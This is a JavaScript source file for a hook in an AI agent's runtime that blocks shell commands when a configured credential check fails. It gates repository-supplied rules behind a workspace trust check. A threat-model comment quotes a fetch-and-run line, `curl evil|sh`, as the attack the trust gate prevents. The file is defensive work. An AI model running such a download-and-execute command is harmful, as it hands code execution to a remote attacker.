// Built-in hook: deny a shell command when its required credential check fails.
//
// Fires on PreToolUse for the agent's command-execution surface (Bash,
// shell_execute_advanced, start_process). Rules come from (merged):
//   1. `${cwd}/.cognia/command-auth.json` → { "rules": [ … ] }
//   2. env `COGNIA_COMMAND_AUTH_RULES` → JSON array (appended after file rules)
// Each rule:
//   {
//     "id"?:               string   — label used in the default deny message
//     "match":             string   — unanchored regex tested against the
//                                     full command line
//     "ensure":            string   — shell command that exits 0 when the
//                                     credential the rule guards is present
//     "ensureTimeoutMs"?:  number   — per-ensure timeout (default 5000)
//     "message"?:          string   — deny guidance shown to the agent;
//                                     should name the re-auth path, not just
//                                     say "denied"
//   }
//
// EVERY rule whose `match` hits runs its `ensure` — a command may need several
// credentials. The first failing `ensure` denies. Outcomes:
//   no rules / no match          → allow (exit 0)
//   every matching ensure ok     → allow (exit 0)
//   an ensure exits non-zero     → deny (exit 2, stderr = reason)
//   rule malformed / ensure can't spawn → soft-allow (exit 0): a
//   misconfigured guard must never lock the user out of their agent.
//
// TRUST GATE: the `${cwd}/.cognia/command-auth.json` rules file is
// repository-controlled content — a cloned repo could put `curl evil|sh` in an
// `ensure` and have it run before the user ever approves the guarded command.
// The file therefore only loads when the workspace is trusted:
//   - `cwd_trusted: true` in the payload — set by hosts that already filtered
//     `cwd` through their own trust ledger (the desktop's trusted-workspace
//     registry via `run_agent_hook`).
//   - the CLI's `<COGNIA_HOME|~/.cognia>/trusted-folders.json` — written by the
//     launch-time "trust this folder" prompt (`cli/src/config/trusted-folders.ts`).
// `COGNIA_COMMAND_AUTH_RULES` stays unconditional: only the process operator
// can set env.
//
// Self-contained (no `lib/` imports) so it runs as a spawned command hook in
// both the desktop (Rust) and CLI runtimes.
import { readFileSync } from "node:fs"
import os from "node:os"
import path from "node:path"
import { spawnSync } from "node:child_process"

const DEFAULT_ENSURE_TIMEOUT_MS = 5000
const MAX_STDERR_LEN = 400

let input
try {
  input = JSON.parse(readFileSync(0, "utf8"))
} catch {
  process.exit(0)
}

// Extract the command line a tool call would run. Mirrors
// lib/claude/permissions/command-from-tool.ts — duplicated on purpose because
// bundled hooks may not import app code (they spawn in both runtimes).
function extractCommand(toolName, toolInput) {
  const obj = toolInput && typeof toolInput === "object" ? toolInput : {}
  const str = (v) => (typeof v === "string" ? v : "")
  const args = (v) => (Array.isArray(v) ? v.filter((a) => typeof a === "string") : [])
  if (toolName === "Bash") {
    const cmd = str(obj.command)
    return cmd.trim() ? cmd : null
  }
  if (toolName === "shell_execute_advanced") {
    const head = str(obj.command)
    if (!head.trim()) return null
    return [head, ...args(obj.args)].join(" ").trim()
  }
  if (toolName === "start_process") {
    const program = str(obj.program)
    if (!program.trim()) return null
    return [program, ...args(obj.args)].join(" ").trim()
  }
  return null
}

const cwd = typeof input.cwd === "string" && input.cwd ? input.cwd : process.cwd()

/**
 * Read the CLI's trusted-folder ledger (`trusted-folders.json`) — the same
 * canonical `path.resolve()` keys `cli/src/config/trusted-folders.ts` writes.
 * Missing/corrupt → empty set → repo rules stay inert.
 */
function trustedFolders() {
  try {
    const home = process.env.COGNIA_HOME?.trim() || path.join(os.homedir(), ".cognia")
    const parsed = JSON.parse(readFileSync(path.join(home, "trusted-folders.json"), "utf8"))
    const folders = Array.isArray(parsed?.folders) ? parsed.folders : []
    return new Set(folders.filter((f) => typeof f === "string").map((f) => path.resolve(f)))
  } catch {
    return new Set()
  }
}

const cwdTrusted = input.cwd_trusted === true || trustedFolders().has(path.resolve(cwd))

function loadRules() {
  const rules = []
  if (cwdTrusted) {
    try {
      const cfg = JSON.parse(readFileSync(path.join(cwd, ".cognia", "command-auth.json"), "utf8"))
      if (Array.isArray(cfg?.rules)) rules.push(...cfg.rules)
    } catch {
      // no project config — env rules may still apply
    }
  }
  // Untrusted cwd: repository rules are skipped entirely — a checked-in
  // `.cognia/command-auth.json` must never get shell execution before the
  // user has approved the folder it lives in.
  try {
    const env = JSON.parse(process.env.COGNIA_COMMAND_AUTH_RULES ?? "[]")
    if (Array.isArray(env)) rules.push(...env)
  } catch {
    // malformed env config — ignore rather than block
  }
  return rules.filter(
    (r) => r && typeof r === "object" && typeof r.match === "string" && typeof r.ensure === "string"
  )
}

const command = extractCommand(input.tool_name, input.tool_input)
if (!command) process.exit(0)

const rules = loadRules()
if (rules.length === 0) process.exit(0)

const isWin = process.platform === "win32"

function runEnsure(ensure, timeoutMs) {
  const result = isWin
    ? spawnSync("cmd", ["/C", ensure], { timeout: timeoutMs, encoding: "utf8" })
    : spawnSync("sh", ["-c", ensure], { timeout: timeoutMs, encoding: "utf8" })
  if (result.error) return { ok: null, detail: result.error.message } // spawn failed ⇒ indeterminate
  return { ok: result.status === 0, detail: (result.stderr || result.stdout || "").trim() }
}

function deny(rule, detail) {
  const label = typeof rule.id === "string" && rule.id.trim() ? rule.id.trim() : rule.match
  const reason =
    typeof rule.message === "string" && rule.message.trim()
      ? rule.message.trim()
      : `Command requires a credential checked by rule "${label}" (\`${rule.ensure}\`), ` +
        `which did not pass. Re-authenticate the tool this command needs, then retry.`
  const clipped =
    detail && detail.length > MAX_STDERR_LEN ? `${detail.slice(0, MAX_STDERR_LEN)}…` : detail
  process.stderr.write(clipped ? `${reason}\nDiagnostic: ${clipped}\n` : `${reason}\n`)
  process.exit(2)
}

for (const rule of rules) {
  let re
  try {
    re = new RegExp(rule.match)
  } catch {
    continue // malformed regex ⇒ skip rule, don't block
  }
  if (!re.test(command)) continue
  const timeout =
    Number.isInteger(rule.ensureTimeoutMs) && rule.ensureTimeoutMs > 0
      ? rule.ensureTimeoutMs
      : DEFAULT_ENSURE_TIMEOUT_MS
  const outcome = runEnsure(rule.ensure, timeout)
  if (outcome.ok === false) deny(rule, outcome.detail)
  // spawn failure (ok === null) or success both fall through to the next rule
}
process.exit(0)
